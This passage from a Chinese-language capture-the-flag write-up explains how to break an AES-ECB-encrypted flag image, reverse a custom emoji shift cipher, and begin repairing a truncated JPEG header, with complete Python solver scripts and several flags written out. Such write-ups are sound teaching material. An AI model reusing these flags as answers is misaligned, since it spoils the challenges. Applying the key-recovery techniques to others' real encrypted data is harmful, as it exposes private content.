class="line">    seed = (seed + b) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(out.decode()) </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;Why_not_use_std::string_instead_of_char_arrays?&#125;</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="安全的加密"><a href="#安全的加密" class="headerlink" title="安全的加密"></a>安全的加密</h3><p>這題展示了為什麼 ECB 加密模式不適合用於圖像資料。</p><ul><li>加密機制分析<br><img src="/img/FhCTF/29.webp" alt="image"></li></ul><p>題目使用腳本將 flag 轉換為 BMP 圖檔後，再透過 AES-256-ECB 加密。特別的是，加密金鑰直接從 flag 的十六進位表示取得。由於 OpenSSL 的 <code>enc</code> 指令在金鑰長度不足時會自動填充零位元組至 32 bytes，實際加密過程中的金鑰是可預測的。</p><ul><li>攻擊向量</li></ul><p>ECB 最致命的弱點在於相同明文區塊總是產生相同密文區塊。當加密對象是結構化資料（如圖像）時，這個特性會直接暴露資料的空間分布模式。</p><ul><li>解密步驟</li></ul><p>由於圖檔格式為 1000×100 像素的 32-bit BMP，每個像素佔 4 bytes，總共 400,000 bytes。AES 以 16-byte 為單位分塊加密，對應到圖像中就是每 4 個像素為一組。</p><p>透過以下步驟重建圖像：</p><ul><li>讀取加密檔案並按 16-byte 切分成區塊</li><li>跳過 BMP 標頭佔用的前 138 bytes（約 9 個區塊）</li><li>將每個加密區塊視為一個顏色單元</li><li>重新排列成 250×100 的區塊陣列（1000÷4&#x3D;250）</li><li>為不同的密文區塊指派不同顏色進行視覺化</li></ul><p>由於文字區域和背景區域的像素值不同，加密後會產生截然不同的密文區塊。透過顏色映射，文字的輪廓會清晰呈現，直接讀取即可得到 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line"><span class="comment"># 設定</span></span><br><span class="line">ENC_FILE = <span class="string">&quot;flag.enc&quot;</span></span><br><span class="line">OUTPUT_DIR = <span class="string">&quot;results&quot;</span></span><br><span class="line">MIN_WIDTH = <span class="number">200</span>  <span class="comment"># 根據經驗或測試調整範圍</span></span><br><span class="line">MAX_WIDTH = <span class="number">300</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="comment"># 1. 讀取加密檔案</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(ENC_FILE, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.read()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 2. 切分區塊 (AES Block Size = 16 bytes)</span></span><br><span class="line">    block_size = <span class="number">16</span></span><br><span class="line">    blocks = [content[i:i+block_size] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(content), block_size)]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 找出背景 (頻率最高的區塊)</span></span><br><span class="line">    counts = Counter(blocks)</span><br><span class="line">    most_common_block = counts.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 4. 轉換為 0/1 Map (1=背景, 0=文字)</span></span><br><span class="line">    pixel_map = [<span class="number">1</span> <span class="keyword">if</span> b == most_common_block <span class="keyword">else</span> <span class="number">0</span> <span class="keyword">for</span> b <span class="keyword">in</span> blocks]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(OUTPUT_DIR):</span><br><span class="line">        os.makedirs(OUTPUT_DIR)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 5. 暴力枚舉寬度並繪圖</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] Generating images from width <span class="subst">&#123;MIN_WIDTH&#125;</span> to <span class="subst">&#123;MAX_WIDTH&#125;</span>...&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> width <span class="keyword">in</span> <span class="built_in">range</span>(MIN_WIDTH, MAX_WIDTH + <span class="number">1</span>):</span><br><span class="line">        height = <span class="built_in">len</span>(pixel_map) // width + <span class="number">1</span></span><br><span class="line">        img = Image.new(<span class="string">&#x27;1&#x27;</span>, (width, height), <span class="number">1</span>)</span><br><span class="line">        pixels = img.load()</span><br><span class="line">        </span><br><span class="line">        idx = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">                <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">                    <span class="keyword">if</span> idx &lt; <span class="built_in">len</span>(pixel_map):</span><br><span class="line">                        <span class="comment"># 如果不是背景(0)，就畫黑點</span></span><br><span class="line">                        <span class="keyword">if</span> pixel_map[idx] == <span class="number">0</span>:</span><br><span class="line">                            pixels[x, y] = <span class="number">0</span> </span><br><span class="line">                        idx += <span class="number">1</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">            </span><br><span class="line">        img.save(<span class="string">f&quot;<span class="subst">&#123;OUTPUT_DIR&#125;</span>/width_<span class="subst">&#123;width&#125;</span>.webp&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/img/FhCTF/30.webp" alt="image"></p><p>我們可以看到是反過來的<code>FhCTF&#123;3C13_m0d3_1s_z0_S3cur17y_&#125;</code><br><img src="/img/FhCTF/31.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;3C13_m0d3_1s_z0_S3cur17y_&#125;</span><br></pre></td></tr></table></figure><h3 id="Encode-By-Py-😘"><a href="#Encode-By-Py-😘" class="headerlink" title="Encode By Py 😘"></a>Encode By Py 😘</h3><p><img src="/img/FhCTF/32.webp" alt="image"></p><p>這題的核心是「自製 Emoji 加密」其實只是一個可逆的位移編碼，加上可預測的 key 循環與大量重複樣本，整體安全性非常脆弱。</p><ul><li><p>整體流程概覽</p><ul><li>程式啟動時會載入一組金鑰字串 <code>ENC_SECRET</code>，預設值是 <code>Hi_S3cL157_xato-net</code>，然後讀取 <code>flag.txt</code> 的內容作為明文。</li><li>主邏輯在 <code>encrypt_bytes</code>，逐 byte 處理輸入，將每個 byte 轉成對應的 Emoji，最後寫出到 <code>flag.enc</code>。</li><li>編碼時使用固定 base（<code>BASE = 0x1F600</code>）和範圍（<code>RANGE = 0x4E</code>），所以結果都落在一小段 Emoji codepoint 區間。</li></ul></li><li><p>單一 byte 的 Emoji 編碼</p><ul><li>對每個明文字節 <code>byte</code>，先計算當前索引 <code>i</code> 對應到 key 的位置 <code>idx</code>，用 <code>ENC_SECRET[idx]</code> 做位移，再搭配 XOR 產生一個偏移量 <code>enc_shift</code>。</li><li>真正輸出的值是<br>[<br>enc_byte &#x3D; ((byte + (enc_shift \oplus RANGE)) \bmod RANGE) + BASE<br>]<br>如果落在特定保留區間則再減去 <code>ALTERNATIVE</code> 做修正，確保最後是合法 UTF-8 Emoji。</li><li>某些特殊 byte（例如換行）不會轉成 Emoji，而是「原樣輸出」，並且用來驅動長度相關的計數變數，影響後面 <code>idx</code> 的計算。</li></ul></li><li><p>索引循環與行為分析</p><ul><li>key 的使用位置不是單純 <code>i % len(ENC_SECRET)</code>，而是 <code>i % ((len_num * len_times) if len_num &gt; 0 else 1)</code>，其中 <code>len_num</code>、<code>len_times</code> 只在碰到特定 byte（實際上就是那個「if byte &#x3D;&#x3D; 某值就原樣輸出」的條件）時才會更新。</li><li>這代表整個加密過程是「被分段的」：每次遇到那個特殊控制字元（例如換行）就會重設或改變循環長度，導致每一行的 key index pattern 不同。</li><li>檔案裡第一大段重複的 <code>✅😢🙈😴</code> 等 emoji，其實就是利用同一個明文字節反覆出現，讓對應的 key 位置重複，成為攻擊者觀察 key 的絕佳樣本。</li></ul></li><li><p>解密邏輯的逆向設計</p><ul><li>要還原明文，第一步是把每個 Emoji 轉回 Unicode codepoint，如果是「被挪到替代區段」的，就加回 <code>ALTERNATIVE</code>，再減掉 <code>BASE</code>，得到原本的「模 RANGE 之前的加密值」。</li><li>接著，用同樣的 key byte 和位移規則，把(enc_byte−BASE)modRANGE<br>反推回bytemodRANGE<br>因為運算中有 <code>% RANGE</code>，所以理論上只能恢復「0..77 的明文模值」，但對這題來說，flag 被映射到一個有限字元集合（ASCII art）中，這樣的資訊已經足夠辨識。</li><li>實作上就是：<ul><li>還原出每個位置對應的 <code>enc_shift</code>。</li><li>用加密公式反向求解原始 byte 在 <code>0..77</code> 的值。</li><li>把這些值映射到一組可視字元表（例如固定順序的 ASCII 字元）上，得到可讀內容。</li></ul></li></ul></li><li><p>利用重複行恢復金鑰</p><ul><li>題目給的第一行是一長串完全規律重複的 emoji pattern，本質上對應同一個明文字元（例如空白或某個固定符號），相當於「已知明文大量重複」。</li><li>對每個重複位置，已知：<ul><li>相同明文字節 <code>byte</code>。</li><li>對應 emoji 的 codepoint（即 <code>enc_byte</code>）。</li><li><code>BASE</code> 與 <code>RANGE</code> 為常數。</li></ul></li><li>於是可以直接把方程式中的 <code>ENC_SECRET[idx]</code> 反推回來，逐個位置解出 key 的每個 byte，最後得到長度為 12 的 key：<br><code>[49, 57, 49, 35, 19, 44, 42, 37, 41, 23, 22, 21]</code><br>並且確認這組鍵值會在整段密文中週期性重複。</li><li>有了完整 key，即可對每個 emoji 進行上述的逆運算，把整個 <code>flag.enc</code> 轉回「mod 78 明文」序列。</li></ul></li><li><p>還原 ASCII art 與 flag</p><ul><li>解碼後得到的並不是直接的一行 flag，而是一個由可視字元構成的大型 ASCII art，風格與 FIGlet 輸出的字型一致。</li><li>把還原出的字元陣列依照原始換行配置輸出，就能看到一個大字樣，裡面嵌著形如 <code>flag&#123;...&#125;</code> 的內容。</li><li>將這段 ASCII art 轉成圖片或直接在等寬字型終端機中觀看，肉眼就可以辨認出真正的 flag。整個過程只利用：<ul><li><p>演算法可逆性。</p></li><li><p>高度重複的已知明文行。</p></li><li><p>有限字元集合導致的模空間縮小。這也說明了「Emoji + 位元運算」並不會自動帶來任何額外安全性，只是另一種換皮的古典密碼而已。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pathlib <span class="keyword">import</span> Path</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image, ImageDraw, ImageFont</span><br><span class="line"></span><br><span class="line"><span class="comment"># 常數定義</span></span><br><span class="line">BASE = <span class="number">0x1F600</span></span><br><span class="line">RANGE = <span class="number">0x4E</span></span><br><span class="line">ALTERNATIVE = <span class="number">0x1CEFE</span></span><br><span class="line">KEY = [<span class="number">49</span>, <span class="number">57</span>, <span class="number">49</span>, <span class="number">35</span>, <span class="number">19</span>, <span class="number">44</span>, <span class="number">42</span>, <span class="number">37</span>, <span class="number">41</span>, <span class="number">23</span>, <span class="number">22</span>, <span class="number">21</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 建立數值到字元的映射表</span></span><br><span class="line">VAL_TO_CHAR = &#123;</span><br><span class="line">    <span class="number">14</span>: <span class="string">&quot;\\&quot;</span>,</span><br><span class="line">    <span class="number">18</span>: <span class="string">&quot;`&quot;</span>,</span><br><span class="line">    <span class="number">32</span>: <span class="string">&quot; &quot;</span>,</span><br><span class="line">    <span class="number">33</span>: <span class="string">&quot;!&quot;</span>,</span><br><span class="line">    <span class="number">39</span>: <span class="string">&quot;&#x27;&quot;</span>,</span><br><span class="line">    <span class="number">40</span>: <span class="string">&quot;(&quot;</span>,</span><br><span class="line">    <span class="number">41</span>: <span class="string">&quot;)&quot;</span>,</span><br><span class="line">    <span class="number">44</span>: <span class="string">&quot;,&quot;</span>,</span><br><span class="line">    <span class="number">45</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="number">46</span>: <span class="string">&quot;.&quot;</span>,</span><br><span class="line">    <span class="number">47</span>: <span class="string">&quot;/&quot;</span>,</span><br><span class="line">    <span class="number">58</span>: <span class="string">&quot;:&quot;</span>,</span><br><span class="line">    <span class="number">60</span>: <span class="string">&quot;&lt;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_encrypted_file</span>(<span class="params">file_path</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;讀取並解析加密的 emoji 文件&quot;&quot;&quot;</span></span><br><span class="line">    raw_data = Path(file_path).read_bytes()</span><br><span class="line">    text = raw_data.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line"></span><br><span class="line">    tokens = []</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot;\n&quot;</span>:</span><br><span class="line">            tokens.append((<span class="string">&quot;newline&quot;</span>, <span class="number">10</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            codepoint = <span class="built_in">ord</span>(char)</span><br><span class="line">            <span class="keyword">if</span> codepoint &lt; BASE:</span><br><span class="line">                codepoint += ALTERNATIVE</span><br><span class="line">            tokens.append((<span class="string">&quot;char&quot;</span>, codepoint - BASE))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tokens</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_index_sequence</span>(<span class="params">tokens</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;建立索引序列用於解密&quot;&quot;&quot;</span></span><br><span class="line">    line_length = <span class="number">0</span></span><br><span class="line">    line_count = <span class="number">0</span></span><br><span class="line">    index_list = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (token_type, _) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tokens):</span><br><span class="line">        idx = i % (line_length * line_count) <span class="keyword">if</span> line_length &gt; <span class="number">0</span> <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">        index_list.append(idx)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> token_type == <span class="string">&quot;newline&quot;</span>:</span><br><span class="line">            <span class="keyword">if</span> line_length == <span class="number">0</span>:</span><br><span class="line">                line_length = i + <span class="number">1</span></span><br><span class="line">            line_count += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> index_list</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_tokens</span>(<span class="params">tokens, index_list</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;解密 token 序列&quot;&quot;&quot;</span></span><br><span class="line">    length = <span class="built_in">len</span>(tokens)</span><br><span class="line">    plaintext_mod = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, (token_type, value) <span class="keyword">in</span> <span class="built_in">enumerate</span>(tokens):</span><br><span class="line">        <span class="keyword">if</span> token_type == <span class="string">&quot;newline&quot;</span>:</span><br><span class="line">            plaintext_mod.append(<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        key_value = KEY[index_list[i] % <span class="built_in">len</span>(KEY)]</span><br><span class="line">        shift = (length - i) % <span class="number">4</span></span><br><span class="line">        decrypted_value = (value - (key_value &lt;&lt; shift)) % RANGE</span><br><span class="line">        plaintext_mod.append(decrypted_value)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> plaintext_mod</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_to_ascii_art</span>(<span class="params">plaintext_mod</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;將解密後的數值轉換為 ASCII 藝術字元&quot;&quot;&quot;</span></span><br><span class="line">    ascii_chars = []</span><br><span class="line">    <span class="keyword">for</span> value <span class="keyword">in</span> plaintext_mod:</span><br><span class="line">        <span class="keyword">if</span> value == <span class="number">10</span>:</span><br><span class="line">            ascii_chars.append(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            ascii_chars.append(VAL_TO_CHAR.get(value, <span class="string">&quot;?&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(ascii_chars)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_ascii_art_to_image</span>(<span class="params">ascii_text, output_path, font_size=<span class="number">16</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;將 ASCII 藝術渲染成圖片&quot;&quot;&quot;</span></span><br><span class="line">    lines = ascii_text.splitlines()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 嘗試載入字體</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        font = ImageFont.truetype(<span class="string">&quot;consola.ttf&quot;</span>, font_size)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            font = ImageFont.truetype(<span class="string">&quot;Courier New.ttf&quot;</span>, font_size)</span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            font = ImageFont.load_default()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 計算圖片尺寸</span></span><br><span class="line">    max_line_length = <span class="built_in">max</span>(<span class="built_in">len</span>(line) <span class="keyword">for</span> line <span class="keyword">in</span> lines) <span class="keyword">if</span> lines <span class="keyword">else</span> <span class="number">0</span></span><br><span class="line">    char_width = font.getbbox(<span class="string">&quot;A&quot;</span>)[<span class="number">2</span>]</span><br><span class="line">    line_height = font.getbbox(<span class="string">&quot;A&quot;</span>)[<span class="number">3</span>] + <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    image_width = max_line_length * char_width + <span class="number">10</span></span><br><span class="line">    image_height = line_height * <span class="built_in">len</span>(lines) + <span class="number">10</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 建立圖片並繪製文字</span></span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>, (image_width, image_height), <span class="string">&quot;white&quot;</span>)</span><br><span class="line">    draw = ImageDraw.Draw(img)</span><br><span class="line"></span><br><span class="line">    y_position = <span class="number">5</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        draw.text((<span class="number">5</span>, y_position), line, fill=<span class="string">&quot;black&quot;</span>, font=font)</span><br><span class="line">        y_position += line_height</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 儲存圖片</span></span><br><span class="line">    img.save(output_path)</span><br><span class="line">    <span class="keyword">return</span> output_path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;主程式流程&quot;&quot;&quot;</span></span><br><span class="line">    input_file = Path(<span class="string">r&quot;C:\Users\zenge\Downloads\files (6)\flag.enc&quot;</span>)</span><br><span class="line">    output_file = Path(<span class="string">r&quot;C:\Users\zenge\Downloads\files (6)\ascii_art.webp&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步驟 1: 解析加密檔案</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在解析加密檔案...&quot;</span>)</span><br><span class="line">    tokens = parse_encrypted_file(input_file)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步驟 2: 建立索引序列</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在建立索引序列...&quot;</span>)</span><br><span class="line">    index_list = build_index_sequence(tokens)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步驟 3: 解密</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在解密...&quot;</span>)</span><br><span class="line">    plaintext_mod = decrypt_tokens(tokens, index_list)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步驟 4: 轉換為 ASCII 藝術</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在轉換為 ASCII 藝術...&quot;</span>)</span><br><span class="line">    ascii_art = convert_to_ascii_art(plaintext_mod)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 步驟 5: 渲染成圖片</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在渲染圖片...&quot;</span>)</span><br><span class="line">    result_path = render_ascii_art_to_image(ascii_art, output_file)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;完成！圖片已儲存至: <span class="subst">&#123;result_path&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nASCII 藝術預覽:&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(ascii_art[:<span class="number">500</span>] + <span class="string">&quot;...&quot;</span> <span class="keyword">if</span> <span class="built_in">len</span>(ascii_art) &gt; <span class="number">500</span> <span class="keyword">else</span> ascii_art)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p><img src="/img/FhCTF/33.webp" alt="image"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FhCTF&#123;S1mpl3_FL46_We4k_P4ss&#125;</span><br></pre></td></tr></table></figure><h3 id="DES-Lv-1-老船長的寶藏"><a href="#DES-Lv-1-老船長的寶藏" class="headerlink" title="DES Lv.1 - 老船長的寶藏"></a>DES Lv.1 - 老船長的寶藏</h3><ul><li><p>Part 1: JPEG 高度修復 (Image Forensics)</p><ul><li><p>題目分析</p><p><strong>目標檔案</strong>: <code>treasuremap.webp</code><br><strong>現象</strong>: 圖片底部被截斷，無法看到完整內容<br><strong>原因</strong>: JPEG 檔案的高度數值在 Hex Header 中被惡意修改，導致瀏覽器只渲染上半部分，底部的關鍵資訊被隱藏[1]</p></li><li><p>核心原理</p><p>JPEG 檔案格式使用 SOF (Start of Frame) 區塊儲存圖片尺寸資訊 ：</p><p><strong>SOF 標記</strong>: <code>FF C0</code> (Baseline DCT) 或 <code>FF C2</code> (Progressive DCT)<br><strong>結構</strong>: <code>[FF C0] [長度(2bytes)] [精度(1byte)] [高度(2bytes)] [寬度(2bytes)]</code><br><strong>位元組序</strong>: Big-Endian (大端序)</p><p>當高度被人為改小時，圖片檢視器會忽略超出高度的像素資料，但這些資料仍完整保留在檔案中。只要將高度值恢復或調大，隱藏的內容就會顯示出來</p></li><li><p>腳本</p><p>A. 讀取與搜尋 SOF 標記</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;treasuremap.webp&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = <span class="built_in">bytearray</span>(f.read())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 搜尋所有 SOF 標記 (FF C0 或 FF C2)</span></span><br><span class="line">matches = [m.start() <span class="keyword">for</span> m <span class="keyword">in</span> re.finditer(<span class="string">b&#x27;\xff[\xc0\xc2]&#x27;</span>, data)]</span><br></pre></td></tr></table></figure><p>此步驟找出所有定義圖片尺寸的 Header 位置。由於 JPEG 可能包含縮圖 (Thumbnail)，因此可能存在多個 SOF 區塊 &#96;</p><p>B. 鎖定主圖片</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">max_width = <span class="number">0</span></span><br><span class="line">target_idx = -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sof_pos <span class="keyword">in</span> matches:</span><br><span class="line">    <span class="comment"># 跳過標記本身 (2 bytes) 和長度欄位 (2 